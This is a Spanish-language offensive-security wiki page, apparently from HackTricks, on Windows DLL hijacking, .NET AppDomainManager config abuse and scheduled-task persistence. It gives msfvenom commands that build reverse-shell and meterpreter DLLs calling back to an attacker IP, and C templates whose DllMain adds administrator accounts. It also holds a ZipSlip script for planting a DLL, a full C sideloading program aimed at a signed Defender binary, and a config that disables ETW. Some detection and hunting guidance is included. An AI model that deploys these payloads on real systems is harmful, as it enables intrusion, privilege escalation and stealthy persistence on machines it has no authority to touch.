# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término engloba varias tácticas como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecutar código, conseguir persistencia y, con menor frecuencia, realizar privilege escalation. Aunque aquí el enfoque está en la escalada, el método de hijacking sigue siendo el mismo independientemente del objetivo.

### Técnicas comunes

Se emplean varios métodos para realizar DLL hijacking, y su efectividad depende de la estrategia de carga de DLL de la aplicación:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente utilizando DLL Proxying para conservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda anterior a la legítima, aprovechando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que la aplicación la cargue, creyendo que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o los archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una equivalente maliciosa en el directorio WinSxS, un método frecuentemente asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, de forma similar a las técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

El DLL sideloading clásico no es la única forma de hacer que un proceso de confianza **.NET Framework** cargue código del atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un archivo de configuración de la aplicación llamado como el ejecutable (por ejemplo, `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si la configuración apunta a un assembly controlado por el atacante colocado junto al EXE, el CLR lo carga **antes de la ruta de ejecución normal de la aplicación** y se ejecuta dentro del proceso de confianza.<sup>[[24]](#references)</sup>

Según el esquema de configuración de .NET Framework de Microsoft, tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` deben estar presentes para utilizar el manager personalizado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuración mínima:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Administrador mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas prácticas:
- Esta técnica es específica de **.NET Framework**. Depende del análisis de configuración del CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **EXE administrado**. Triaje rápido: `sigcheck -m target.exe`, `corflags target.exe`, o comprobar la presencia del **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente se encuentra **junto al EXE**.
- Esto resulta útil con binarios **firmados de Microsoft/proveedores** porque el EXE de confianza permanece intacto mientras el assembly administrado malicioso se ejecuta en el mismo proceso.
- Si ya tienes un directorio de instalación/actualización con permisos de escritura, el secuestro de AppDomainManager puede utilizarse como **primera etapa**, seguido de un DLL sideloading clásico o una carga reflectiva para las etapas posteriores.

### AppDomainManager como downloader + bootstrap de una tarea programada

Un patrón práctico de intrusión consiste en combinar el EXE administrado de confianza con un `*.config` malicioso y un DLL de AppDomainManager malicioso que actúe únicamente como un **bootstrapper pequeño**:<sup>[[25]](#references)</sup>

1. El usuario inicia un instalador o actualizador .NET firmado desde una ubicación creíble, como `%USERPROFILE%\Downloads`.
2. El archivo de configuración adyacente hace que el CLR cargue el assembly del atacante **antes** de que comience la lógica de la aplicación legítima.
3. El manager malicioso realiza un **path gate** (por ejemplo, solo continúa si el EXE host se está ejecutando desde `Downloads`, y solo permite que la segunda etapa se ejecute desde `%LOCALAPPDATA%`).
4. Si la comprobación tiene éxito, descarga el payload real en una ruta con permisos de escritura para el usuario, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistence mediante una tarea programada.

Por qué importa esta variante:
- El EXE host firmado permanece sin cambios, por lo que un triaje que solo calcule hashes del binario principal puede no detectar el compromiso.
- Es común aplicar una **anti-analysis basada en rutas**: mover la tríada ZIP/EXE/DLL al Escritorio, a Temp o a una ruta de sandbox puede romper intencionadamente la cadena.
- El DLL de AppDomainManager de la primera etapa puede mantenerse pequeño y generar poco ruido mientras el implant real se descarga posteriormente.

Ejemplo mínimo de persistence observado con frecuencia en este patrón:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` significa **highest available** para ese usuario/sesión; por sí solo no garantiza una escalada a SYSTEM.
- Esta técnica suele categorizarse mejor como **ejecución/persistencia mediante abuso de la configuración de .NET** que como un classic missing-DLL search-order hijacking, aunque los operadores suelen encadenar ambas.

Pivots de detección:
- Ejecutables .NET firmados lanzados desde **rutas de extracción ZIP**, `Downloads`, `%TEMP%` u otras carpetas modificables por el usuario, con un `<exe>.config` **ubicado junto al ejecutable**.
- Nuevas scheduled tasks cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads`, y cuyos nombres imitan a actualizadores de navegadores o proveedores.
- Procesos bootstrap administrados de corta duración que descargan inmediatamente otro EXE y luego ejecutan `schtasks.exe`.
- Samples que terminan prematuramente a menos que la ruta del ejecutable coincida con un directorio esperado dentro del perfil del usuario.

### Hijacking de una scheduled task existente para relanzar la cadena de sideload

Para obtener persistencia, no busques únicamente **crear una nueva task**. Algunos intrusion sets esperan a que un instalador legítimo cree una **task normal de actualización** y luego **reescriben la acción de la task**, de modo que el nombre, el autor y el trigger existentes sigan resultando familiares para los defensores.

Workflow reutilizable:
1. Instala o ejecuta el software legítimo e identifica la task que normalmente crea.
2. Exporta el XML de la task y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Reemplaza únicamente la acción para que la task inicie tu **EXE host de confianza** desde un directorio de staging modificable por el usuario, que después haga sideload o cargue mediante AppDomain el payload real.
4. Vuelve a registrar el mismo nombre de task en lugar de crear un artefacto de persistencia nuevo y evidente.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por qué es más sigiloso:
- El nombre de la tarea todavía puede parecer legítimo (por ejemplo, un actualizador de un vendor).
- El servicio **Task Scheduler** la inicia, por lo que la validación del proceso padre/ancestro suele ver la cadena de scheduling esperada en lugar de `explorer.exe`.
- Los equipos de DFIR que solo buscan **nuevos nombres de tareas** pueden pasar por alto una tarea cuyo registro ya existía, pero cuya acción ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%` u otra ruta controlada por el atacante.

Pivotes rápidos para hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara el XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera una alerta cuando una **tarea de actualización con apariencia de vendor** se ejecute desde **directorios escribibles por el usuario** o inicie un EXE de .NET con un archivo `*.config` ubicado junto a él.

> [!TIP]
> Para consultar una cadena paso a paso que combina HTML staging, configuraciones AES-CTR e implants de .NET sobre DLL sideloading, revisa el workflow siguiente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando Dlls faltantes

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **2 filtros siguientes**:

![Técnicas comunes - Encontrando Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (961).png>)

![Técnicas comunes - Encontrando Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (230).png>)

y mostrar únicamente **File System Activity**:

![Técnicas comunes - Encontrando Dlls faltantes: y mostrar únicamente File System Activity](<../../../images/image (153).png>)

Si estás buscando **dlls faltantes en general**, **deja** esto ejecutándose durante algunos **segundos**.\
Si estás buscando una **dll faltante dentro de un ejecutable específico**, debes configurar **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.<sup>[[9]](#references)</sup>

## Explotando Dlls faltantes

Para escalar privilegios, nuestra mejor oportunidad es poder **escribir una dll que un proceso privilegiado intente cargar** en alguno de los **lugares donde se buscará**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busque antes** que en la carpeta donde se encuentra la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se busque la dll** y la **dll original no exista** en ninguna carpeta.

### Orden de búsqueda de Dll

**En la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes consultar cómo se cargan específicamente las Dlls.**

Las **aplicaciones de Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia concreta. El problema del DLL hijacking surge cuando se coloca estratégicamente una DLL maliciosa en uno de estos directorios, de modo que se cargue antes que la DLL auténtica. Una solución para evitarlo es garantizar que la aplicación utilice rutas absolutas al referirse a las DLLs que necesita.

A continuación puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits**:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema. Utiliza la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No existe ninguna función que obtenga la ruta de este directorio, pero se busca en él. (_C:\Windows\System_)
4. El directorio de Windows. Utiliza la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que aparecen en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada mediante la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Este es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual pasa al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (el valor predeterminado es habilitado).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Por último, ten en cuenta que **una dll puede cargarse indicando la ruta absoluta en lugar de únicamente el nombre**. En ese caso, esa dll **solo se buscará en esa ruta** (si la dll tiene dependencias, estas se buscarán como si se hubieran cargado solo por nombre).

Existen otras formas de modificar el orden de búsqueda, pero no las explicaré aquí.

### Encadenar una escritura arbitraria de archivos con un hijack de DLL faltante

1. Utiliza filtros de **ProcMon** (`Process Name` = EXE objetivo, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar los nombres de DLL que el proceso busca pero no encuentra.<sup>[[14]](#references)</sup>
2. Si el binario se ejecuta mediante un **schedule/service**, colocar una DLL con uno de esos nombres en el **directorio de la aplicación** (entrada n.º 1 del orden de búsqueda) hará que se cargue en la siguiente ejecución. En un caso con un scanner de .NET, el proceso buscaba `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Construye una DLL de payload (por ejemplo, reverse shell) con cualquier export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitive es una **escritura arbitraria al estilo ZipSlip**, crea un ZIP cuya entrada escape del directorio de extracción para que la DLL termine en la carpeta de la aplicación:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archivo comprimido al buzón/recurso compartido supervisado; cuando la tarea programada vuelva a iniciar el proceso, cargará la DLL maliciosa y ejecutará tu código como la cuenta de servicio.

### Forzar el sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath de RTL_USER_PROCESS_PARAMETERS al crear el proceso mediante las API nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, se puede obligar a un proceso objetivo que resuelva una DLL importada por nombre (sin una ruta absoluta y sin usar las flags de carga seguras) a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde se encuentra tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará el DllPath proporcionado durante la resolución, lo que permite un sideloading fiable incluso cuando la DLL maliciosa no se encuentra junto al EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o cargar mediante LoadLibrary una DLL por nombre (sin una ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no pueden ser hijacked. Las exportaciones reenviadas y SxS pueden cambiar la precedencia.

Ejemplo mínimo en C (ntdll, cadenas anchas, gestión de errores simplificada):

<details>
<summary>Ejemplo completo en C: forzar el sideloading de DLL mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca una xmllite.dll maliciosa (que exporte las funciones requeridas o actúe como proxy de la real) en tu directorio DllPath.
- Inicia un binario firmado conocido por buscar xmllite.dll por nombre mediante la técnica anterior. El loader resuelve la importación mediante el DllPath proporcionado y carga lateralmente tu DLL.

Esta técnica se ha observado en campañas reales para ejecutar cadenas de sideloading de varias etapas: un launcher inicial deposita una DLL auxiliar, que luego inicia un binario firmado por Microsoft susceptible de hijacking con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>


### Hijacking de .NET AppDomainManager mediante `.exe.config`

Para objetivos de **.NET Framework**, el sideloading puede realizarse **antes de `Main()`** sin modificar la memoria, abusando del archivo **`.exe.config`** adyacente de la aplicación. En lugar de depender únicamente del orden de búsqueda de DLL de Win32, el atacante coloca un EXE legítimo junto a un config malicioso y uno o más assemblies controlados por el atacante.

Cómo funciona la cadena:<sup>[[15]](#references)[[22]](#references)</sup>
1. El EXE host se inicia y el **CLR lee `<exe>.config`**.
2. El config establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`**, de modo que el runtime instancie un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene **ejecución antes de `Main()`** dentro del proceso host de confianza.
4. El mismo config puede forzar al CLR a resolver primero los assemblies locales (por ejemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación/telemetría del runtime sin modificar inline.

Patrón de estilo campaña (el anidamiento exacto puede variar según la directiva / versión del CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Por qué es útil:
- **`<probing privatePath="."/>`** mantiene la resolución de ensamblados en el directorio de la aplicación, convirtiendo la carpeta en una superficie de sideloading predecible.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** desplazan la ejecución al código del atacante durante la inicialización del CLR, antes de que se ejecute la lógica legítima de la aplicación.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una aplicación full-trust cargue ensamblados sin firmar o manipulados sin que se produzca un error de validación de strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita las redirecciones de publisher-policy a ensamblados más recientes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hace que la selección del runtime sea más determinista.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** es especialmente interesante porque el **CLR desactiva su propia visibilidad ETW** desde la configuración, en lugar de que el implant parche `EtwEventWrite` en memoria.

Patrón operativo observado en campañas recientes:
- La fase 1 deposita `setup.exe`, `setup.exe.config` y ensamblados locales.
- La fase 2 los copia en una carpeta creíble de **actualización en AppData**, cambia el nombre del host a algo como `update.exe` y lo vuelve a ejecutar mediante una **tarea programada**.
- La fase 3 verifica el contexto de ejecución (por ejemplo, que el proceso padre esperado sea `svchost.exe` desde Task Scheduler) antes de cargar la DLL/export final del RAT.

Ideas para hunting:
- **Ejecutables .NET** firmados o considerados legítimos que se ejecutan con archivos **`.config`** adyacentes sospechosos en ubicaciones donde el usuario puede escribir.
- Archivos `.config` que contengan **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Tareas programadas que vuelvan a ejecutar binarios de actualización renombrados desde **`%LOCALAPPDATA%`** o desde directorios específicos de la aplicación como **`\bin\update\`**.
- Cadenas de procesos padre/hijo donde una tarea programada inicia un host .NET de confianza que inmediatamente carga ensamblados que no pertenecen al proveedor desde su propio directorio.

#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows

En la documentación de Windows se indican ciertas excepciones al orden de búsqueda estándar de DLL:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si existe una redirección y un manifiesto antes de utilizar la DLL ya presente en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- Cuando la DLL se reconoce como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si solo se hubieran indicado mediante sus **nombres de módulo**, independientemente de si la DLL inicial se identificó mediante una ruta completa.

### Escalación de privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar con **privilegios diferentes** (movimiento horizontal o lateral) y al que le falte una DLL.
- Asegurarse de que exista **acceso de escritura** en cualquier **directorio** en el que se vaya a **buscar la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio incluido en la ruta del sistema.

Sí, los requisitos son complicados de encontrar, ya que **por defecto es un tanto extraño encontrar un ejecutable privilegiado al que le falte una DLL** y es aún **más extraño tener permisos de escritura en una carpeta de la ruta del sistema** (no se puede por defecto). Sin embargo, esto es posible en entornos mal configurados.\
Si tienes suerte y cumples los requisitos, puedes consultar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es omitir UAC**, allí puedes encontrar un **PoC** de un Dll hijaking para la versión de Windows correspondiente que puedes utilizar (probablemente solo tengas que cambiar la ruta de la carpeta en la que tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un ejecutable y los exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obtener una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una carpeta de **System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en alguna carpeta dentro de System PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **funciones de PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo correctamente sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que Dll Hijacking resulta útil para [escalar de un nivel de integridad Medium a High **(omitiendo UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre dll hijacking centrado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos básicos de dll** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Dll Proxifying**

Básicamente, un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como se **espera**, **redirigiendo todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres proxificar y **generar una dll proxificada**, o **indicar la Dll** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86; no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### La tuya

Ten en cuenta que, en varios casos, la DLL que compiles debe **exportar varias funciones** que serán cargadas por el proceso víctima; si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.

<details>
<summary>Plantilla de DLL en C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL de C alternativa con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía busca al iniciarse una DLL de localization predecible y específica del idioma que puede ser hijacked para ejecutar código arbitrario y establecer persistence.<sup>[[7]](#references)</sup>

Hechos clave
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL controlada por el atacante y con permisos de escritura en la ruta de OneCore, esta se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silencioso
